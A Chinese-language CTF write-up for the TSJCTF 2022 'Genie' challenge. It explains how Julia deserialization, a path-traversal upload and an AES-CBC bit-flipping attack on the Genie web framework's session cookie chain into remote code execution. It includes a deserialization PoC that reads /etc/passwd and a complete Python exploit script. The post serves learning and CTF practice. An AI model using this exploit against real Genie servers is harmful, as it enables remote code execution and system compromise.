---
title: exp-of-the-Genie
date: 2023-03-20 23:29:33
tags:
mathjax: true
---



### 0x1 Abstract & Deploy



> Julia: 一个面向科学计算的高性能动态高级程序设计语言。
>
> Genie: 基于Julia开发的全栈Web 框架。
>
> exploit：上传文件名从`sessions/\x1`到`sessions/\xFF`的序列化数据，伪造解密后只有1byte的session，触发反序列化。
>
> keywords: 反序列化, session id, AES bit flipping attack
>
> 0Day: YES
>
> author:  [maple3142](https://github.com/maple3142) & [splitline](https://github.com/splitline)
>
> CTF Challenge: TSJCTF 2022 Genie(Crypto & Web) 



安装Julia https://julialang.org/downloads/ 一路点next 添加环境变量

<img src="https://i.328888.xyz/2023/03/21/PQPEN.png" style="zoom:50%;" />

安装Genie: 一行搞定

`pkg> add Genie`

运行`using Genie.Sessions`可能会报`ERROR: UndefVarError: Sessions not defined`的错，是因为Genie V5的更新把旧的session功能集成到了`GenieSession`这个新插件中。



### 0x2 Julia issue 32641 



> 序列化：把对象转换为字节形式存储的过程称为对象的序列化
>
> 反序列化：把字节序列转化为对象的过程

Julia 有反序列化漏洞，issue 32641 提供了现成的poc 

```julia
julia> using Serialization
julia> Serialization.deserialize(s::Serializer, t::Type{BigInt})=run(`cat /etc/passwd`);"反序列化任何东西就能rce" 
julia> filt=filter(methods(Serialization.deserialize).ms) do m
       String(m.file)[1]=='R' end;
julia> Serialization.serialize("poc.serialized_jl", (filt[1], BigInt(7)));
```

在`1.1.1`之后，要两次才能触发到：

```julia
julia> using Serialization
julia> Serialization.deserialize("poc.serialized_jl");
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/usr/bin/nologin
[...]
```



原理：不懂（逃）

> 好像是反序列化时会覆盖一个玩意，比如这里就用BigInt盖掉了反序列化大数的方法，然后执行自己想要的东西。

有点搞的是，官方也不知道咋处理这个↓

![](https://i.328888.xyz/2023/03/21/TqCvv.png)



而Genie框架就是用序列化存储session的。

> Session:“会话控制”。Session对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的Web页之间跳转时，存储在Session对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web页时，如果该用户还没有会话，则Web服务器将自动创建一个 Session对象。当会话过期或被放弃后，服务器将终止该会话。

<img src="https://img-blog.csdnimg.cn/20200810201646714.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hkazIxNjY=,size_16,color_FFFFFF,t_70" style="zoom:50%;" /> 



### 0x3 Genie



题目是个文件上传页面：

```julia
Sessions.init() "启用session"

route("/upload", method = POST) do
  if infilespayload(:file)
    f = filespayload(:file)
    p = joinpath(upload_dir, f.name) "遍历攻击，文件名为../../../就能传任意路径"
    if isfile(p)
      "File already exists"
    else
      write(p, f.data)
      sess = Sessions.session(params())
      files = Sessions.get(sess, :uploaded_files, [])
      push!(files, p)
      Sessions.set!(sess, :uploaded_files, files)
      redirect(p)
    end
  else
    "No file uploaded"
  end
end
```



关于 Genie Session:

1. 存储序列化数据

> 反序列化就能RCE

2. 为每个session创建唯一的文件名`session/f(session_id)`(类似php session)

> 拿到sessionid就能反序列化

3. session id是数据的密文

> 能拿到session id 吗？



### 0x4 Encrypted session id 

cookie的内容：

<img src="https://i.328888.xyz/2023/03/24/iiJwsC.png" style="zoom:50%;" />

```
+-------------------------------------------------------------------+
|                                                                   |
|     {"name": "__geniesid", "value": 0xc0ffee} //64bytes密文        |
|                                                                   |
+-------------------------------------------------------------------+
                                  |                                  
                                  |                                       
+-------------------------------------------------------------------+
|                                                                   |
|       AES/CBC decrypt(__geniesid)   ->真正的 session id            |
|                                                                   |
+-------------------------------------------------------------------+
                                  |                                  
                                  |                                                      
+-------------------------------------------------------------------+
|                                                                   |
|               open("sessions/"+<明文 session id>)                   |
|                                                                   |
+-------------------------------------------------------------------+
                                  |                                  
                                  |                                                     
+-------------------------------------------------------------------+
|                                                                   |
|                  Serialization.deserialize(内容)                    |
|                                                                   |
+-------------------------------------------------------------------+
                                                                     
```

 注意到sessionid是经过`AES/CBC`加密的。

加密：

![img](https://ctf-wiki.org/crypto/blockcipher/mode/figure/cbc_encryption.png)

解密：

![img](https://ctf-wiki.org/crypto/blockcipher/mode/figure/cbc_decryption.png)

-  Padding Oracle
- Bit flipping 

Padding oracle 不太可行，原因是iv通过`Genie.secret_token`产生，而且padding错误也不会报error。那就只有Bit flipping(字节翻转)了。

**字节翻转攻击**：一种明文攻击，通过控制aes的一部分密文，改变另一部分对应的明文。

观察**解密过程**不难发现：

- IV影响第一个明文分组
- 第n个密文分组影响第n+1个明文分组

假设第n个密文分组为$C_n$,，解密后的第n个明文分组为$P_n$，就有如下对应关系:$P_{n+1}=C_n\oplus f(C_{n+1})$，f是解密函数。

如果某个信息的明文和密文已知，那么修改$C_n$为$C_n\oplus P_{n+1}\oplus A$，再异或$f(C_{n+1})$解密，第n+1个明文就会变成A。



### 0x5 Cryptography Bug 



对于session id的加密，我们是其实是可以知道最后一组明文的。由于采用`PKCS#5`的填充方式，文件名长度又是64字节，所以最后一个block必然填充为`"\x10"*16` 。

padding后的效果如图：

```
      block#1           block#2           block#3           block#4             block#5
+-----------------+-----------------+-----------------+-----------------+---------------------+
|  Filename[:16]  | Filename[16:32] | Filename[32:48] | Filename[48:64] | Padding ("\x10"*16) |
+-----------------+-----------------+-----------------+-----------------+---------------------+
```

最要命的是，Julia 的Unpadding函数还特别抽象：

```Julia
function trim_padding_PKCS5(data::Vector{UInt8})
  padlen = data[sizeof(data)]
  return data[1:sizeof(data)-padlen] "???"
end
```

它导致只要传的数据是`len(plaintext)-1`，就能把最后一个byte前的所有明文覆盖掉！

> 这个问题在去年3月时被发现，现在已经修改了，我在查JuliaCrypto日志的时候才发现lol

![](https://i.328888.xyz/2023/03/22/aeBoX.png)

新的padding函数：

```julia
function trim_padding_PKCS5(data::Vector{UInt8})
  padlen = data[sizeof(data)]
    if all(data[end-padlen+1:end-1] .== data[end]) "规避了错误padding的问题"
    return data[1:sizeof(data)-padlen]
  else
    throw(ArgumentError("Invalid PKCS5 padding"))
  end
end
```

最终要构造的密文就长这样：



```
ForgedCiphertext = (("\x10" * 16) XOR Ciphertext(block#4) XOR ("\x1f" * 16)) + CipherText(block#5)
```

> x1f是32-1，32就是两个block的长度。

![](https://i.328888.xyz/2023/03/22/QWIFk.jpeg)



最终解密得到的明文只有`data[1]`1byte，也就是第4个block解密后的第一个byte。我们不知道它是多少，但已经不重要了。



### Genie's exp 



先上传254个恶意文件，文件名从`"../sessions/x01"` 到 `"../sessions/xFF"` (`.`和`/`除外)，然后构造解密后只有1byte的encrypted_sessionid，触发反序列化。我们不需要知道解密的那1byte到底是多少，因为它必然在所有254个文件中。

```python
import requests
import os
import subprocess

if os.path.exists('./exp'):
    os.unlink('exp')

os.system('julia ./gen_session.jl')

with open("exp", "rb") as f:
    payload = f.read()

host ="http://xxxx"
auth = ('xxxx', 'xxxx')


# 从 sessions/<char> 传序列化文件
for i in range(1, 0xff):
    if chr(i) in ["/", "."]:
        continue
    # 用curl而不是requests库 避免被urlEncode编码
    subprocess.run([
        'curl', f"{host}/upload", "-u", ':'.join(auth),
        "-F", b"file=@exp;filename=../sessions/"+bytes([i])
    ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("Uploading: ", i, "/", len(range(1, 0xff)), end='\r')

# 新版本需要触发两次反序列化，这里触发4次保证能request到
for _ in range(4):
    r = requests.get(host, auth=auth)
    encrypted = bytes.fromhex(r.cookies["__geniesid"])
    print("Orignial session: ", encrypted.hex())

    def xor(a, b):
        return bytes([x ^ y for x, y in zip(a, b)])

    original_padding = b"\x10" * 16
    target = b"A"*15 + bytes([31])
    forged_block = xor(xor(original_padding, target), encrypted[-32:-16])

    forged_session = (forged_block + encrypted[-16:]).hex()
    print("Forged session: ", forged_session)

    try:
        requests.get(host, auth=auth, cookies=dict(
            __geniesid=forged_session
        ),  timeout=1)
    except:
        pass

```



